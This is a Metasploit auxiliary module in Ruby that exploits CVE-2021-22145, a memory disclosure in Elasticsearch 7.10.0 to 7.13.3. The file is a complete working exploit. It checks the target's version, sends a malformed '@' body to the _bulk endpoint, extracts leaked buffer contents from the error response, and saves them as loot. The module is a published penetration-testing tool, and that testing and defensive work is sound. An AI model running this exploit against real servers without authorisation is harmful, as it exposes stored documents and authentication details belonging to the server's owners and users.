##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner

  DEDUP_REPEATED_CHARS_THRESHOLD = 400

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Elasticsearch Memory Disclosure',
        'Description' => %q{
          This module exploits a memory disclosure vulnerability in Elasticsearch
          7.10.0 to 7.13.3 (inclusive). A user with the ability to submit arbitrary
          queries to Elasticsearch can generate an error message containing previously
          used portions of a data buffer.
          This buffer could contain sensitive information such as Elasticsearch
          documents or authentication details. This vulnerability's output is similar
          to heartbleed.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die', # msf module
          'Eric Howard', # discovery
          'R0NY' # edb exploit
        ],
        'References' => [
          ['EDB', '50149'],
          ['CVE', '2021-22145'],
          ['URL', 'https://discuss.elastic.co/t/elasticsearch-7-13-4-security-update/279177']
        ],
        'DisclosureDate' => '2021-07-21',
        'Actions' => [
          ['SCAN', { 'Description' => 'Check hosts for vulnerability' }],
          ['DUMP', { 'Description' => 'Dump memory contents to loot' }],
        ],
        'DefaultAction' => 'SCAN',
        # https://docs.metasploit.com/docs/development/developing-modules/module-metadata/definition-of-module-reliability-side-effects-and-stability.html
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [] # nothing in the docker logs anyways
        }
      )
    )
    register_options(
      [
        Opt::RPORT(9200),
        OptString.new('USERNAME', [ false, 'User to login with', '']),
        OptString.new('PASSWORD', [ false, 'Password to login with', '']),
        OptString.new('TARGETURI', [ true, 'The URI of the Elastic Application', '/']),
        OptInt.new('LEAK_COUNT', [true, 'Number of times to leak memory per SCAN or DUMP invocation', 1])
      ]
    )
  end

  def get_version
    vprint_status('Querying version information...')
    request = {
      'uri' => normalize_uri(target_uri.path),
      'method' => 'GET'
    }
    request['authorization'] = basic_auth(datastore['USERNAME'], datastore['PASSWORD']) if datastore['USERNAME'].present? || datastore['PASSWORD'].present?

    res = send_request_cgi(request)

    return nil if res.nil?
    return nil if res.code == 401

    if res.code == 200 && !res.body.empty?
      json_body = res.get_json_document
      if json_body.empty?
        vprint_error('Unable to parse JSON')
        return
      end
    end

    json_body.dig('version', 'number')
  end

  def check_host(_ip)
    version = get_version
    return CheckCode::Unknown("#{peer} - Could not connect to web service, or unexpected response") if version.nil?

    if Rex::Version.new(version) <= Rex::Version.new('7.13.3') && Rex::Version.new(version) >= Rex::Version.new('7.10.0')
      return Exploit::CheckCode::Appears("Exploitable Version Detected: #{version}")
    end

    Exploit::CheckCode::Safe("Unexploitable Version Detected: #{version}")
  end

  def leak_count
    datastore['LEAK_COUNT']
  end

  # Stores received data
  def loot_and_report(data)
    if data.to_s.empty?
      vprint_error("Looks like there isn't leaked information...")
      return
    end

    print_good("Leaked #{data.length} bytes")
    report_vuln({
      host: rhost,
      port: rport,
      name: name,
      refs: references,
      info: "Module #{fullname} successfully leaked info"
    })

    if action.name == 'DUMP' # Check mode, dump if requested.
      path = store_loot(
        'elasticsearch.memory.disclosure',
        'application/octet-stream',
        rhost,
        data,
        nil,
        'Elasticsearch server memory'
      )
      print_good("Elasticsearch memory data stored in #{path}")
    end

    # Convert non-printable characters to periods
    printable_data = data.gsub(/[^[:print:]]/, '.')

    # Keep this many duplicates as padding around the deduplication message
    duplicate_pad = (DEDUP_REPEATED_CHARS_THRESHOLD / 3).round

    # Remove duplicate characters
    abbreviated_data = printable_data.gsub(/(.)\1{#{(DEDUP_REPEATED_CHARS_THRESHOLD - 1)},}/) do |s|
      s[0, duplicate_pad] +
        ' repeated ' + (s.length - (2 * duplicate_pad)).to_s + ' times ' +
        s[-duplicate_pad, duplicate_pad]
    end

    # Show abbreviated data
    vprint_status("Printable info leaked:\n#{abbreviated_data}")
  end

  def bleed
    request = {
      'uri' => normalize_uri(target_uri.path, '_bulk'),
      'method' => 'POST',
      'ctype' => 'application/json',
      'data' => "@\n"
    }
    request['authorization'] = basic_auth(datastore['USERNAME'], datastore['PASSWORD']) if datastore['USERNAME'].present? || datastore['PASSWORD'].present?

    res = send_request_cgi(request)

    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Invalid credentials (response code: #{res.code})") unless res.code == 400

    json_body = res.get_json_document
    if json_body.empty?
      vprint_error('Unable to parse JSON')
      return
    end
    leak1 = json_body.dig('error', 'root_cause')
    return if leak1.blank?

    leak1 = leak1[0]['reason']
    return if leak1.nil?

    leak1 = leak1.split('(byte[])"')[1].split('; line')[0]

    leak2 = json_body.dig('error', 'reason')
    return if leak2.nil?

    leak2 = leak2.split('(byte[])"')[1].split('; line')[0]

    "#{leak1}\n#{leak2}"
  end

  def run
    memory = ''
    1.upto(leak_count) do |count|
      vprint_status("Leaking response ##{count}")
      memory << bleed
    end
    loot_and_report(memory)
  end
end
